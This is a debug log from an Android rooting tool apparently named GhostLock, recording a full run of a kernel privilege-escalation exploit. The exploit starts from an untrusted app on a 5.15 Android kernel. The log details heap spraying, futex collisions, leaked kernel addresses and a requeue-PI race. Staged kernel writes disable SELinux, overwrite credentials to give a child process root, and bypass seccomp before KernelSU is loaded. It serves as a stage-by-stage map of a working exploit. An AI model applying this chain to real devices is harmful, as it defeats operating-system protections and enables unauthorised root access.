debug log: Download/GhostLock/ghostlock-20260918-105419-027-0-direct.log
ksud ready
[33m[*] [0mroot script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=5225
[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mruntime verbose_debug=1
[33m[*] [0mdebug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=2000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=16
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=50000
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=200000
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.routes.multicast_waiter.ready_timeout_ms=10000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[33m[*] [0miomem cache: direct_map_end=ffffff8a80000000
[32m[+] [0mstartup context pid=11188 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=42755 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=11188 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[32m[+] [0mbuild config pid=11188 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=11188 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+3ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+94ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +317ms
[33m[*] [0m[spray] finding futex collisions... +630ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray]   still finding collisions (2s) 31% (futex 0xa000000/0x1000000000)...
[33m[*] [0m[spray] futex collisions found +2866ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff895e7e5c00 +2916ms
[33m[*] [0m[spray] payload ready +2926ms
[31m[-] [0mpage ffffff895e7e0000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 1/4 +3252ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +325ms
[33m[*] [0m[spray] finding futex collisions... +678ms
[33m[*] [0m[spray] early collision screen 13/7 at 31%
[33m[*] [0m[spray]   still finding collisions (2s) 31% (futex 0xa000000/0x1000000000)...
[33m[*] [0m[spray] futex collisions found +3225ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8907a0ac00 +3232ms
[33m[*] [0m[spray] payload ready +3233ms
[31m[-] [0mpage ffffff8907a08000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 2/4 +6747ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +314ms
[33m[*] [0m[spray] finding futex collisions... +692ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray]   still finding collisions (2s) 31% (futex 0xa000000/0x1000000000)...
[33m[*] [0m[spray] futex collisions found +3064ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff803dbc0800 +3101ms
[33m[*] [0m[spray] payload ready +3106ms
[31m[-] [0mpage ffffff803dbc0000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 3/4 +10165ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +316ms
[33m[*] [0m[spray] finding futex collisions... +662ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2444ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8026731400 +2459ms
[33m[*] [0m[spray] payload ready +2464ms
[33m[*] [0mprepare_kernel_page ok attempt=4 +12801ms
[33m[*] [0m[T+12900ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+14911ms]   PI route done
[32m[+] [0mSELinux permissive
[33m[*] [0mW1b: private scratch repair attempt 1/3
[33m[*] [0m=== W1b: private scratch repair === target=0xffffff8026730108 mode=1 leaf=1
[33m[*] [0m[T+15016ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +263ms
[33m[*] [0m[spray] finding futex collisions... +533ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2077ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8026a40c00 +2096ms
[33m[*] [0m[spray] payload ready +2102ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2283ms
[33m[*] [0m[T+17304ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+19323ms]   PI route done
[32m[+] [0mprivate scratch repaired; releasing quarantine
[33m[*] [0m[T+19331ms] Write 1 complete
[33m[*] [0m[T+19547ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff804634da00 (163/256 votes)
[33m[*] [0mperf task: 0xffffff804634da00 (177/256 votes)
[33m[*] [0m[T+20414ms] perf_find_task done
[33m[*] [0mchild_pid=26095 child_task=0xffffff804634da00
[33m[*] [0mvr.ko not loaded; skipping tag clear
[33m[*] [0mW2: cred attempt 1/15
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +226ms
[33m[*] [0m[spray] finding futex collisions... +469ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2081ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8023c4fc00 +2091ms
[33m[*] [0m[spray] payload ready +2099ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2266ms
[33m[*] [0mW2 fast repair payload prebuilt
[33m[*] [0m=== W2: cred === target=0xffffff804634e198 mode=2 leaf=0
[33m[*] [0m[T+22918ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +251ms
[33m[*] [0m[spray] finding futex collisions... +512ms
[33m[*] [0m[spray] early collision screen 14/7 at 31%
[33m[*] [0m[spray] futex collisions found +2029ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff89139aac00 +2066ms
[33m[*] [0m[spray] payload ready +2077ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2251ms
[33m[*] [0m[T+25172ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+27185ms]   PI route done
[33m[*] [0mW2b: firing prebuilt init_cred+8 repair
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0mchild uid = 0
[32m[+] [0mchild is root!
[33m[*] [0mW3: TIF_SECCOMP+mode attempt 1/6
[33m[*] [0m=== W3: TIF_SECCOMP === target=0xffffff804634da00 mode=1 leaf=1
[33m[*] [0m[T+28532ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +241ms
[33m[*] [0m[spray] finding futex collisions... +487ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2104ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff89ab224000 +2165ms
[33m[*] [0m[spray] payload ready +2171ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2342ms
[33m[*] [0m[T+30878ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+32889ms]   PI route done
[33m[*] [0m=== W3: seccomp mode === target=0xffffff804634e260 mode=1 leaf=1
[33m[*] [0m[T+32944ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +263ms
[33m[*] [0m[spray] finding futex collisions... +520ms
[33m[*] [0m[spray] early collision screen 15/7 at 31%
[33m[*] [0m[spray] futex collisions found +2073ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff891329a000 +2085ms
[33m[*] [0m[spray] payload ready +2091ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +2256ms
[33m[*] [0m[T+35203ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+37213ms]   PI route done
[33m[*] [0mseccomp finit_module probe = 0x16
[32m[+] [0mchild seccomp filter bypassed (finit_module errno=22)
[32m[+] [0mchild seccomp fully bypassed (forked workers run filter-free)
[33m[*] [0m[T+39276ms] exploit complete
[33m[*] [0mhandoff: child=26095 alive=1 sent=1 errno=0
[33m[*] [0mhandoff: root script path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mhandoff: root shell worker pid=11658
[33m[*] [0mhandoff: script open fd=3 errno=0 path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[*] root script start uid=0 euid=0
[*] seccomp=Seccomp:	0 Seccomp_filters:	0 
[*] ksud=/data/user/0/com.ghostlock.app/files/ksud
[*] ksud_file=-rwx------ 1 u0_a510 u0_a510 4892712 2026-09-18 10:54 /data/user/0/com.ghostlock.app/files/ksud
[*] uname=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[*] iomem cache: cached 12860 bytes
[*] fixup: attempt 1
1+0 records in
1+0 records out
1 bytes (1 B) copied, 0.013 s, 76 B/s
[*] policyload before=0 after=2
[*] policy fixup rc=0
[*] late-load kmi=android13-5.15
[*] late-load exit=0
[*] temp su uid=0; watching kernelsu.ko
[+] KernelSU module loaded
[33m[*] [0menforce=1 (enforcing)
[32m[+] [0mKernelSU ready
